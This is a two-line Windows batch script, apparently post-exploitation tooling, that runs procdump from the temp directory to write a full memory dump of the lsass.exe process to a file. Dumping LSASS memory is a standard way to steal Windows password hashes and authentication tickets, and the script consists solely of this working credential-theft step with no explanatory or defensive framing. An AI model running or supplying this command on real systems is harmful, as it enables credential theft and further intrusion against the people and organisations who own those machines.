@echo off
%temp%\procdump.exe -accepteula -ma lsass.exe %temp%\dump_file.dmp 2>&1